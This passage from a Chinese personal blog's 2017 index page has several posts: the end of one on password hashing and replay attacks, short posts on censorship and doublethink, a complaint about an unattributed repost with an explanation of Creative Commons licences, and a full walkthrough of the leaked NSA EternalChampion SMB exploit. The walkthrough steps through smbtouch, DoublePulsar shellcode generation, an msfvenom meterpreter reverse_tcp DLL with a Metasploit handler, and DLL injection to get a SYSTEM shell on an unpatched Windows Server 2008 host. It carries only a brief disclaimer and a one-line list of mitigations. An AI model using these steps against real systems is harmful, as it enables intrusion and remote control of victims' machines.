<h3 id="只使用客户端哈希，SSL"><a href="#只使用客户端哈希，SSL" class="headerlink" title="只使用客户端哈希，SSL"></a>只使用客户端哈希，SSL</h3><p>很显然骇客拿到哈希的机率就很低了；但是假如服务器的数据库被脱下来了，那么还是一样的道理，只要发送哈希给服务器，就能够被授权登录，照样被重放攻击。</p>
<p>想要加个序号、时间戳、随机数什么的防止重放攻击？只要明文就是扯淡……被脱库照样完蛋。</p>
<p>在这种情况下被重放攻击的根本原因是，<strong>服务器太过于相信客户端</strong>，服务器认为客户端发出的请求都是经过正常的应用逻辑的，服务器把客户端发过来的哈希值直接存入数据库。</p>
<h3 id="至少使用服务端哈希、非SSL"><a href="#至少使用服务端哈希、非SSL" class="headerlink" title="至少使用服务端哈希、非SSL"></a>至少使用服务端哈希、非SSL</h3><p>不说啥了，MITM即可。</p>
<h3 id="至少使用服务端哈希，SSL"><a href="#至少使用服务端哈希，SSL" class="headerlink" title="至少使用服务端哈希，SSL"></a>至少使用服务端哈希，SSL</h3><p>这种情况下，哪怕黑客拿到数据库，也只能玩彩虹表了；如果程序员安全意识比较强，用了随机盐，那就更不好破解了。</p>
<p>总结一句话就是，<strong>不带SSL就是耍流氓，至少要使用服务端哈希</strong>。（客户端用JS搞个RSA，大哥，你是来搞笑的吗？这和客户端哈希没有任何本质上的区别，照样重放）</p>
<p>好吧，关于程序员的安全素质，我目前就能想到这几点。</p>
<h2 id="1984与双重思想"><a href="#1984与双重思想" class="headerlink" title="1984与双重思想"></a>1984与双重思想</h2><p>请先看一遍下面这个图（凤凰网在911十周年的街头采访视频），图片偷自<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2014/01/doublethink.html">编程随想</a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_13.png"><img src="/images/061017_0014_13-214x1024.png"></a></p>
<p>如果你不觉得这个人脑袋有问题、不觉得有矛盾，那么恭喜，你多半已经被朝廷改造成双重思想了。</p>
<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9B%99%E6%83%B3">双重思想</a>（doublethink）来自于乔治·奥威尔的1984，简单说就是<strong>同时接受两种互相矛盾的、抵触的思想信念却不觉得矛盾</strong>。</p>
<p>对真理部记录司的雇员们来说，双想意味着可以歪曲史实，然后对他们刚写下的新历史坚信不移。双重思想不仅仅可以用来洗脑民众，还可以用来洗脑体制的维护者，而且效果贼好！</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>好吧，历时九个月，我终于把<a target="_blank" rel="noopener" href="https://dmesg.app/school-0.html">这一系列</a>的坑填完了，感谢当时鼓励我开这一系列的某同学，感谢鼓励我的某学长，当然更要感谢给了我无数灵感的某童鞋！我们下个系列再见???</p>
<p>最后，请允许我用著名文学家小罗伯特·土而奇·豆斯基的一句话来结束本文吧：</p>
<p>黄色的道路上分出了两条路，我选择了绕远的那条路，是因为我知道哪怕有万分之一遇见你的机会也是值得的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/10/school-6/index/" data-id="clhp7rtjd0089s2qr8o4vcjo4" data-title="[学校上网系列]6.从下载软件中想到的：哎妈呀防不胜防啊" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-remember/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/06/03/remember/index/" class="article-date">
  <time class="dt-published" datetime="2017-06-03T00:00:00.000Z" itemprop="datePublished">2017-06-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/china/">china</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/06/03/remember/index/">人们不会忘记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>有个成语叫做“欲盖弥彰”，意思就是想掩盖坏事的真相，结果反而更明显地暴露出来。</p>
<p>可能有人低估了咱的智商，可有些人毕竟没那么傻，可悲的是大部分人都是沉默的大多数、大部分人都成为了他们想让我们成为的人。</p>
<p>请一定要记得自由思想、独立思考与批判性思维。我们可以大声的喊出2+2&#x3D;4，我们可以自由的表达自己的思想。</p>
<p>人们不会忘记，我又怎能忘记？</p>
<blockquote>
<p>以肮脏龌龊的匠人之手，我必对你们痛加报复。</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/06/03/remember/index/" data-id="clhp7rtih007fs2qr222z5quj" data-title="人们不会忘记" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-insert-my-link/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/05/28/insert-my-link/index/" class="article-date">
  <time class="dt-published" datetime="2017-05-28T00:00:00.000Z" itemprop="datePublished">2017-05-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/05/28/insert-my-link/index/">我喜欢被转载，但是请记得给我署名</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>经过一些沟通，freebuf原文中终于加入了我的署名。</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>昨晚闲来无事，突然发现自己博客多了很多来自freebuf的referer（freebuf在白帽子中挺有名的），遂点进去看看，发现有一个人以原创的名义全篇转载了我的博文<a target="_blank" rel="noopener" href="https://dmesg.app/eternalchampion.html">《[ShadowBroker]2: NSA工具集EternalChampion漏洞复现、ShellcodeBuffer》</a>，名为<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/135270.html">《NSA武器库之Eternalchampion（永恒冠军）复现》</a>，并且没有在文章中署名。好吧，我承认我有的时候不会给文章起名，你这个起的确实比我有水平。</p>
<p>由于freebuf的巨大用户基数，截止我发文时，该文已经有了19万啊呸我上来排版的时候都<strong>20万的访问量</strong>说不定你看到的时候会更多，并且得到了其他网站的转载（比如说<a target="_blank" rel="noopener" href="http://www.myhack58.com/Article/60/63/2017/86501.htm">黑吧安全网的转载</a>，来源佚名W5B，想想I18N是啥意思你就知道W5B是啥意思了），而原文只有可怜巴巴的三位数访问量。</p>
<p>需要注意的是，我将不会纠结于访问量，我知道我的网站访问量来源主要是来自于Google、feed、友情链接和加入收藏夹直接访问的朋友，SEO做的不好、访问量低是正常的。此次我将纠结的问题是文章的授权协议，真是<strong>又气愤又荣幸又好心寒啊。</strong></p>
<p>鉴于部分国内用户对版权的无视和践踏已经到了丧心病狂的地步，再加上最近心情不太好，遂写此科普文，顺便<strong>撒撒脾气</strong>。</p>
<h2 id="本站文章采用何种方式进行授权"><a href="#本站文章采用何种方式进行授权" class="headerlink" title="本站文章采用何种方式进行授权"></a>本站文章采用何种方式进行授权</h2><p>在导航栏下的banner、文章下面、页脚footer，我三次声明本站文章默认使用CC-BY-NC-SA4.0进行授权，并且两次说明需要注明原作者和地址；在<a target="_blank" rel="noopener" href="https://dmesg.app/about-me">《我是谁》</a>中上来就提了文章版权的问题，并且随后便提了我对于友情链接的要求：</p>
<p><img src="/images/052717_1445_1.png"></p>
<p>别说，我还真拒绝了一个友链，某童鞋可能知道后续，偏见和先入为主，不知道该不该说讽刺啊。</p>
<p>在继续进行之前，我有必要解释下CC协议是什么，以下对于CC协议的总结来自于<a target="_blank" rel="noopener" href="http://antig.pub/">川宝宝</a></p>
<h3 id="CC协议："><a href="#CC协议：" class="headerlink" title="CC协议："></a>CC协议：</h3><p>该协议一般用于文字影音类资源，一般不用于代码的授权。</p>
<p>对CC协议的说明摘自：<a target="_blank" rel="noopener" href="http://creativecommons.net.cn/licenses/licenses_exp/">http://creativecommons.net.cn/licenses/licenses_exp&#x2F;</a>，页脚和文末的版权声明也是带有超链接的。</p>
<p><strong>署名（BY）</strong>： 您允许他人对自己享有著作权的作品及演绎作品进行复制、发行、展览、表演、放映、广播或通过信息网络向公众传播，但<strong>在这些过程中对方必须保留您对原作品的署名</strong>。</p>
<p>例如：小红在她的摄影作品上使用了”署名”的授权条款，因为她希望在他人在使用她的图片时尊重自己的署名。小明在网上找到她的摄影作品并希望在自己网站的首页上进行展示。在这种情况下，小明可以将小红的图片放在他的网站上，只要<strong>清楚地指明小红是作者</strong>即可。</p>
<p><strong>非商业性使用（NC）</strong>：您允许他人对您享有著作权的作品及演绎作品进行复制、发行、展览、表演、放映、广播或通过信息网络向公众传播，但<strong>仅限于非商业性目的</strong>。</p>
<p>例如：小明在他的网站上以包含”非商业性使用”要素的许可协议发表了他的摄影作品。在这种情况下，小红可以打印使用小明的这幅照片。但是，如果没有小明的允许，小红<strong>不得出售这张打印的照片</strong>。</p>
<p><strong>禁止演绎（ND）：</strong>您允许他人对您的作品原封不动地进行复制、发行、展览、表演、放映、广播或通过信息网络向公众传播，但<strong>不得进行演绎创作</strong>。</p>
<p>例如：小红在自己的一首歌曲上使用包含”禁止演绎”要素的许可协议。小明想截取小红歌曲片段混合在他的作品中而产生出全新的歌曲。在这种情况下，没有小红的允许，小明将不能这么做（除非他的歌曲构成合理使用）。</p>
<p><strong>相同方式共享（SA）：</strong>只有在他人对演绎作品使用与您的<strong>原作品相同的许可协议</strong>的情况下，您才允许他人发行其演绎作品。</p>
<p>注：许可协议协议不能同时包含”相同方式共享”和”禁止演绎”许可要素，”相同方式共享”要素仅适用于演绎作品。</p>
<p>例如：小明的网上照片采用了包含”非商业性使用”和”相同方式共享”要素的许可协议。小红是一位业余的抽象拼贴艺术家，她截取小明的照片并且将其使用到她的一件拼贴作品之中，在上述情况下，小红必须按照小明作品所适用的许可协议的要求，在她的拼贴作品上适用包含”非商业性使用”和”相同方式共享”要素的许可协议，将自己的作品以<strong>同于小明所选的许可协议</strong>发表。</p>
<p>如果一篇文章授权是：CC-BY-NC-SA，翻译过来就是该文采用CC协议授权，如果引用<strong>必****须表明来自哪个作者和源地址</strong>，<strong>不可商用，但可以演绎</strong>，且演绎后的内容<strong>必须用同样的协议</strong>（CC-BY-NC-SA）发布。</p>
<p>CC协议有若干版本，现在多采用4.0版本授权，但是大同小异，想了解详细的自行查找官方文档。</p>
<h2 id="为什么我又气愤又荣幸"><a href="#为什么我又气愤又荣幸" class="headerlink" title="为什么我又气愤又荣幸"></a>为什么我又气愤又荣幸</h2><p>咦这就好像一边笑一边哭，还好这只是两种情绪，要是两种人格，啊不对27种人格，欢迎大家来到X教授前前前前传之《分裂》……行了不扯了。</p>
<h3 id="气愤的是"><a href="#气愤的是" class="headerlink" title="气愤的是"></a>气愤的是</h3><p>很不幸的是，在我昨晚发现freebuf这篇文章的时候，全文并没有提到我的名字，也没有标注地址，要不是我<strong>喜欢内链自己的博文</strong>，说不定我都发现不了这么多referer呢。我是非常注重版权的，对于这种事情自然不能忍。</p>
<p>可笑的地方是把我不小心笔误打错的地方也粘贴过来了。<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017052714473614.jpg"><img src="/images/2017052714473614.jpg"></a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017052714474067.jpg"><img src="/images/2017052714474067.jpg"></a></p>
<p>32位dll用64位监听，必然会连上就挂的，我那还少个空格呢，哈哈。我是不是该说没有直接盗我的图，要不都变成我的防盗链图可不好玩是吧。</p>
<p>我记得以前在哪看到过，咱这写博客不容易，不如就故意加入几个错别字来作为”特征指纹”吧，这样就能够很比较有效的区分抄袭和演绎了（演绎你也得给我署名啊）。</p>
<p>我知道你复制粘贴不容易，可能还得重新排版，但是我写文章的比你不容易一千倍不是么。我知道你转载还是原创之后会让更多人从此篇文章中受益（这样的文章……希望大家不要拿来做坏事），但是署名这种举手之劳的事情，就办不到了么？</p>
<p>在文章开头署名，文章结尾署名可以，文章不注明转载无所谓，<strong>只要你署名了我就不介意</strong>；我要是懒了可能NC和SA都懒得争论，但是唯有<strong>BY是不可改变的坚持</strong>。</p>
<h3 id="荣幸的是"><a href="#荣幸的是" class="headerlink" title="荣幸的是"></a>荣幸的是</h3><p>我的文章被转载这代表着<strong>别人对我的认可</strong>，并且这会成为激励我写出更优秀文章的动力；转载的越多我越开心呢是吧，可是这样这就成为了不留署名的理由了么？很让人心寒，打击积极性啊！</p>
<p>不得不说国内的意识真的很差，人家<a target="_blank" rel="noopener" href="http://www.chinagfw.org/2017/05/ssh1sshssh.html">ChinaGFW转载我的文章</a>在开头就贴上了链接，真的是一个GFW的差距么？，还有好几个转载不署名的，我都悄悄记着呢……</p>
<p>也许是<a target="_blank" rel="noopener" href="https://v2mm.tech/topic/748/%E6%9C%89%E5%93%AA%E4%BA%9B%E4%B8%AD%E5%9B%BD%E4%BA%BA%E8%87%AA%E5%B7%B1%E5%8F%91%E7%8E%B0%E4%B8%8D%E4%BA%86-%E5%A4%96%E5%9B%BD%E4%BA%BA%E5%8D%B4%E8%83%BD%E7%9C%8B%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%AD%E5%9B%BD%E7%8E%B0%E7%8A%B6%E6%88%96%E9%97%AE%E9%A2%98/2">不止一个GFW的差距</a>吧，所谓十年树木百年树人，<strong>洗脑教育的荼毒可能要两三代人才会祛除</strong>，不知何时能扭转这种局面：</p>
<blockquote>
<p>知乎上程序员和学生多，自然大部分人都知道墙的存在。</p>
<p>但是即使是程序员，也有太多人懒得&#x2F;不会翻Q，固然他们知道墙的存在，但是却很难知道某些显而易见的事实，比如为什么谷歌比百度好用，为什么诺贝尔文学奖比和平奖出名，<strong>这是墙存在的目的，也是墙造成的后果。</strong></p>
<p>然而千千万万普通的网民，大多数却甚至都不知道墙的存在，只知道百度而不知道有谷歌，只会用微博而不知有推特，当在知乎上发现某个答案不存在的时候还以为真的来到了知识的荒原，在微博上关注了成百上千的名人大V，却不知道大部分其实是网评员。更别提每天还有无数的新闻事件都404了。</p>
<p>不是说外国人都知道我们中国有墙，但是只要我们走出去看一看，很快就能发现这一点吧。当然，<strong>存在心里的墙就更难被发现了。</strong></p>
</blockquote>
<p> </p>
<h2 id="v2mm的故事"><a href="#v2mm的故事" class="headerlink" title="v2mm的故事"></a>v2mm的故事</h2><p>在寒假和朋友出去吃饭的时候，我突然收到了两篇非常长的评论，v2mm站长认为我的文章质量不错，希望我<a target="_blank" rel="noopener" href="https://v2mm.tech/topic/228/%E4%B8%8E%E5%8E%9F%E5%88%9B%E5%8D%9A%E5%AE%A2%E4%BD%9C%E8%80%85%E7%9A%84%E5%90%88%E4%BD%9C%E8%AE%BE%E6%83%B3-%E4%B8%93%E6%A0%8F%E8%AE%A1%E5%88%92">加入v2mm成为专栏博主</a>。那时我的心情真的是很激动，都没和朋友吃饭一直在想这件事情，有一种被慧眼识珠的感觉。</p>
<p>V2MM 定位于一个自由职业者社区，<strong>一个原创社区</strong>，一个有特色的社区，一个自由的社区。</p>
<p>我在这里提到v2mm，是因为v2mm是一个注重原创的社区。随着移动设备的流行，碎片化阅读、快餐文化也开始变得流行，能够<strong>写博客、写独立域名的博客、写独立域名自由表达思想的博客</strong>越来越少了。2017年，还在写博客不容易，共勉。</p>
<h2 id="事件后续"><a href="#事件后续" class="headerlink" title="事件后续"></a>事件后续</h2><p>2017年5月30日经过沟通，文中最后加上了我的署名。所以这事就算Game Over了。</p>
<p> </p>
<p>不过，来推特找我吧<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks">@BennyThinks</a> （感谢几位支持我的朋友呗…）</p>
<h2 id="我想咋样？打算怎么做"><a href="#我想咋样？打算怎么做" class="headerlink" title="我想咋样？打算怎么做"></a>我想咋样？打算怎么做</h2><p>我就是想能不能给俺加个署名，<strong>丢个链接就成</strong>？俺可是很擅长写邮件的噢…</p>
<h2 id="顺便提一句软件的许可证协议"><a href="#顺便提一句软件的许可证协议" class="headerlink" title="顺便提一句软件的许可证协议"></a>顺便提一句软件的许可证协议</h2><p>通常CC协议不会用于软件的源代码，对于源代码，通常有这么几种协议，某童鞋可能需要了解下：</p>
<h3 id="MIT协议："><a href="#MIT协议：" class="headerlink" title="MIT协议："></a>MIT协议：</h3><p>多用于软件代码授权，相当宽松的协议，MIT是麻省理工的名字？对，你没有猜错，它来自麻省理工学院。RUBY ON RAILS就采用MIT协议授权，还有Linuxer常用的putty也是MIT授权。</p>
<p>该协议除了需要【在软件和软件的所有副本中都必须包含版权声明和许可声明】之外，可以随便搞，包括任意引用，任意修改，改完了还可以拿去卖钱，嗯，就是这么任性~</p>
<h3 id="BSD协议："><a href="#BSD协议：" class="headerlink" title="BSD协议："></a>BSD协议：</h3><p>多用于软件代码授权，相当宽松的协议，来自加州大学伯克利分校。该协议除了需要【不可用作者名义推广二次开发产品，二次开发产品必须采用BSD，尊重作者著作权】之外，基本没其他限制了。</p>
<p>除此之外，用于软件代码授权的协议还有Apache啊什么的。</p>
<p>在这些协议中有一个非常严格的协议，被称作GPL，GPL有点像CC协议，并且GPL在一些国家具有法律效力，<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html">具体就自己搜搜吧</a>。大家可以看图来大概理解下：<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/201705271449178.png"><img src="/images/201705271449178.png"></a></p>
<p><a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html">来源见水印</a></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><h3 id="请大家一定要记得"><a href="#请大家一定要记得" class="headerlink" title="请大家一定要记得"></a>请大家一定要记得</h3><p>大家一定要记得，<strong>开源并不代表着放弃版权</strong>（自由软件也不等于开源软件），乱用开源代码违背了开源的精神。</p>
<p>退他一万步来讲，咱穷用着盗版的Windows、Photoshop，咱能理解，尤其是学生没钱、还不太会用GNU&#x2F;Linux，买不起游戏下破解等等，咱真的可以理解，这真的没办法；但是署个名，能让你价值八百块的机械键盘折寿五年或者是损伤你的肌腱神经吗？</p>
<h3 id="有必要这样大动干戈么"><a href="#有必要这样大动干戈么" class="headerlink" title="有必要这样大动干戈么"></a>有必要这样大动干戈么</h3><p>熟悉我的人知道，我本人原则性很强，有很多怪脾气，很多事情我都可以容忍可以得过且过，但是又有一些事情是一丝一毫都不能忍的。这就是其中之一。</p>
<p>作为一名并不咋资深的博主、并不合格的码农、疯狂的游戏玩家，我知道写文章的不易、我也知道撸代码的痛苦、我更知道那些独立游戏的制作有多么心酸，咱就从举手之劳做起好吧。</p>
<p>我不想加个JS，像知乎那样一复制就会自动包含作者、标题、链接，这样对于伸手复制粘贴代码什么的真是不太不方便了（好多时候我自己都这么干呢），所以只能靠自觉了。<strong>我喜欢被转载，但是记得给俺链接丢上去</strong>，丢到结尾也成，好不？谢谢合作呗，给你发糖吃哦。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/28/insert-my-link/index/" data-id="clhp7rtgs0042s2qrcf5cc8oe" data-title="我喜欢被转载，但是请记得给我署名" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-eternalchampion/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/05/16/eternalchampion/index/" class="article-date">
  <time class="dt-published" datetime="2017-05-16T00:00:00.000Z" itemprop="datePublished">2017-05-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/05/16/eternalchampion/index/">[ShadowBroker]2: NSA工具集EternalChampion漏洞复现、ShellcodeBuffer</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[v_error]警告： 本文<strong>仅供实验性研究</strong>，请勿用于非法用途，出啥事我不负责。真的！别算我头上，我胆小害怕。[&#x2F;v_error]</p>
<p>目前，某些特定版本的Windows 10也可以了，可以参见这个PR <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/9473">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>
<p>话说几天之前<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/WannaCry">WannaCry</a>的爆发真是让EternalBlue又火了一番，不少学校、公司都中招了。可不，我的博客都蹭热度有了前所未有的800PV（还是UV）。</p>
<p>我想起来三个多星期之前曾经写过<a target="_blank" rel="noopener" href="https://dmesg.app/shadowbroker.html">《EternalBlue+Doublepulsar+meterpreter渗透Windows》</a>，EternalBlue使用几乎是没有门槛，但是有的时候会不支持某些特定的操作系统，此时就要使用其他的Eternal系列了，比如说EternalChampion。</p>
<p>但是在使用EternalChampion的时候，发现它需要<code>ShellcodeBuffer</code>，如下图所示，按照常理讲，这玩意不应该运行了就啪啪啪植入后门了么？</p>
<p><img src="/images/051617_0646_ShadowBroke1.png"></p>
<p>ShellcodeBuffer :: DOPU Shellcode buffer</p>
<p>类似地，EternalRomance也需要Shellcode，不像EternalBlue那样直接一路回车就行了。</p>
<p>有些人的第一想法可能是用msf生成一个shellcode，然后在这里指定文件，但实际上这样做会似的目标机器蓝屏的，为啥，因为这玩意需要<code>DOPU Shellcode</code>，DOPU是啥，哎，不就是<strong>DO</strong>uble<strong>PU</strong>lsar吗？</p>
<p>所以，此次咱们就从SMB出发，看看能用上啥漏洞利用工具吧！</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>此次配置环境和上篇差不多</p>
<h3 id="攻击机1"><a href="#攻击机1" class="headerlink" title="攻击机1"></a>攻击机1</h3><p>带有漏洞利用工具集的XP，并且此次需要准备好<a target="_blank" rel="noopener" href="http://www.winhex.com/winhex/">WinHex</a>， IP 172.26.97.35</p>
<h3 id="攻击机2"><a href="#攻击机2" class="headerlink" title="攻击机2"></a>攻击机2</h3><p>Kali， IP 172.26.97.226</p>
<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>Windows Server 2008 SP1 x86， IP 202.X.X.X，已经开启445端口</p>
<h2 id="开启FuzzBunch"><a href="#开启FuzzBunch" class="headerlink" title="开启FuzzBunch"></a>开启FuzzBunch</h2><p>不知道怎么运行FuzzBunch的，请参考我的<a target="_blank" rel="noopener" href="https://dmesg.app/shadowbroker.html">上篇博文</a>，操作方式和上次一样。<code>TargetIP</code>写靶机IP 202.X.X.X，<code>CallBack</code>写运行fb的IP，也就是172.26.97.35，不使用Redirection</p>
<p><img src="/images/051617_0646_ShadowBroke2.png"></p>
<h2 id="使用smbtouch探测"><a href="#使用smbtouch探测" class="headerlink" title="使用smbtouch探测"></a>使用smbtouch探测</h2><p>use smbtouch<br>execute</p>
<p>smbtouch会为我们探测出目标系统适用的漏洞利用程序</p>
<p><img src="/images/051617_0646_ShadowBroke3.png"></p>
<p>在这里我们可以看到，目标系统是32位的，EternalBlue和EternalSynergy不支持攻击靶机，EternalRomance无法攻击，<strong>只有</strong>EternalChampion可以。</p>
<h2 id="使用Doublepulsar生成shellcode"><a href="#使用Doublepulsar生成shellcode" class="headerlink" title="使用Doublepulsar生成shellcode"></a>使用Doublepulsar生成shellcode</h2><p>smbtouch成功之后，我们使用Doublepulsar来生成shellcode</p>
<p>use Doublepulsar</p>
<p>我们一路回车默认，会发现多出来一个名为<code>OutputInstall</code>的选项，选择这个</p>
<p><img src="/images/051617_0646_ShadowBroke4.png"></p>
<p>然后输入路径，比如说<code>C:\shellcode.bin</code>，一路回车执行就会生成shellcode</p>
<h2 id="将shellcode转换成HEX"><a href="#将shellcode转换成HEX" class="headerlink" title="将shellcode转换成HEX"></a>将shellcode转换成HEX</h2><p>由于EternalChampion需要的是<code>ShellcodeBuffer</code>而不是<code>ShellcodeFile</code>，所以这里我们需要将Doublepulsar生成的shellcode转换成十六进制；如果你用的是EternalRomance，那么应该用的是<code>ShellcodeFile</code>，可以跨过此步</p>
<p>使用WinHex打开我们刚刚生成的<code>shellcode.bin</code>，然后选择<code>Edit-Copy All-Hex Values</code>，如下图所示：</p>
<p><img src="/images/051617_0646_ShadowBroke5.png"></p>
<h2 id="使用EternalChampion进行攻击"><a href="#使用EternalChampion进行攻击" class="headerlink" title="使用EternalChampion进行攻击"></a>使用EternalChampion进行攻击</h2><p>现在shellcode已经在我们的剪贴板中了，我们就要使用EternalChampion来进行攻击了。</p>
<p>use EternalChampion</p>
<p>一路回车，在程序提示<code>ShellcodeBuffer :: DOPU Shellcode buffer</code>时右键粘贴进那一堆十六进制，由于Shellcode比较长（4KB），所以可能会花几秒钟才会粘贴完。有人反应直接输入4096、50也行。</p>
<p><img src="/images/051617_0646_ShadowBroke6.png"></p>
<p>在之后我们一路回车默认，信息应该都是和目标系统相符的。在<code>Mode :: Delivery mechanism</code>时像上次一样选择FB</p>
<p><img src="/images/051617_0646_ShadowBroke7.png"></p>
<p>之后程序会进行询问，我们回车就能够运行EternalChampion</p>
<p>啊哟， 赢了，金牌，NSA你们这群人真幽默……</p>
<p><img src="/images/051617_0646_ShadowBroke8.png"></p>
<p>注意：如果你是用的exploit需要<code>Shellcode File</code>，那么这里直接输入shellcode的路径，本例中为<code>C:\shellcode.bin</code>，推荐把shellcode放在根目录，据GitHub上某人的回复，如果放在某个目录下可能会导致exploit不认。</p>
<h2 id="使用Doublepulsar注入恶意dll"><a href="#使用Doublepulsar注入恶意dll" class="headerlink" title="使用Doublepulsar注入恶意dll"></a>使用Doublepulsar注入恶意dll</h2><p>在这之后，我们使用Doublepulsar注入恶意dll，和上次操作基本一致，这里我们就再复述下吧</p>
<p>但是在此之前，我想看看后门是否存在，那就Doublepulsar中的选择<code>function: 1 ping</code>，就可以确定后门是否存在啦</p>
<p><img src="/images/051617_0646_ShadowBroke9.png"></p>
<p>好，咱还是生成恶意dll并用Doublepulsar注入吧！</p>
<h3 id="msfvenom生成恶意dll"><a href="#msfvenom生成恶意dll" class="headerlink" title="msfvenom生成恶意dll"></a>msfvenom生成恶意dll</h3><p>切换到Kali，此次就使用<code>reverse_tcp</code>了</p>
<p>#32位操作系统，所以生成32位的dll<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.26.97.226 LPORT&#x3D;8089 -f dll &gt;badbad.dll<br>#打开MetaSploit，开始监听；如果靶机是64位系统，自行更换<br>set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp<br>use exploit&#x2F;multi&#x2F;handler<br>set LHOST 172.26.97.226<br>set LPORT 8089<br>run</p>
<p>之后将这个dll拷贝到XP中，使用Python创建个http服务器</p>
<p>python –m SimpleHTTPServer 80</p>
<p>拿起久违的IE，下载这个<code>badbad.dll</code>文件</p>
<h3 id="注入dll"><a href="#注入dll" class="headerlink" title="注入dll"></a>注入dll</h3><p>use DoublePulsar</p>
<p>一路回车默认，只需要选择<code>function 2 Run DLL</code>，输入我们的dll文件路径</p>
<p><img src="/images/051617_0646_ShadowBroke10.png"></p>
<p>然后最后直接运行，就会发现反弹成功，拿到权限了！</p>
<p><img src="/images/051617_0646_ShadowBroke11.png"></p>
<h2 id="啊哟，执行不了meterpreter命令？"><a href="#啊哟，执行不了meterpreter命令？" class="headerlink" title="啊哟，执行不了meterpreter命令？"></a>啊哟，执行不了meterpreter命令？</h2><p>在一些情况下，我们可能会拿到meterpreter的会话，但是可能会发现执行不了啥命令，ping下不通了，猜测目标机器蓝屏了，那咋办呢？</p>
<p>等等直到ping通，然后再次运行EternalChampion攻击，它会记得我们输入的shellcode，所以一路回车，然后再次运行Doublepulsar，在程序提示<code>ProcessName [lsass.exe]:</code>选择其他的以<code>NT Authority\System</code>运行的进程名，比如说<code>spoolsv.exe, SearchIndexer.exe, lsm.exe</code>，这就自己试试了。然后就应该不会蓝屏啦~</p>
<p>其实选择啥进程其实都是可以的，大不了运行meterpreter的时候<code>migrate</code>到其他进程就可以了。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="EternalBlue支持的系统"><a href="#EternalBlue支持的系统" class="headerlink" title="EternalBlue支持的系统"></a>EternalBlue支持的系统</h3><p>通过查看xml文件能发现，有点奇怪，EternalBlue的配置文件中支持了这么多系统，但是有时却报告不支持。</p>
<p><img src="/images/051617_0646_ShadowBroke12.png"></p>
<h3 id="Special？"><a href="#Special？" class="headerlink" title="Special？"></a>Special？</h3><p>大家能看到，EternalBlue和EternalChampion是在<code>Windows\Specials</code>这个目录下，Special，足以看到这俩工具威力是多么巨大吧！真是可怕……</p>
<h3 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h3><p>安装SM17-010补丁，开启防火墙过滤445，关闭SMB服务。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/16/eternalchampion/index/" data-id="clhp7rtga002rs2qrf7zk0865" data-title="[ShadowBroker]2: NSA工具集EternalChampion漏洞复现、ShellcodeBuffer" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-wanna-cry/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/05/14/wanna-cry/index/" class="article-date">
  <time class="dt-published" datetime="2017-05-14T00:00:00.000Z" itemprop="datePublished">2017-05-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>
  </div>

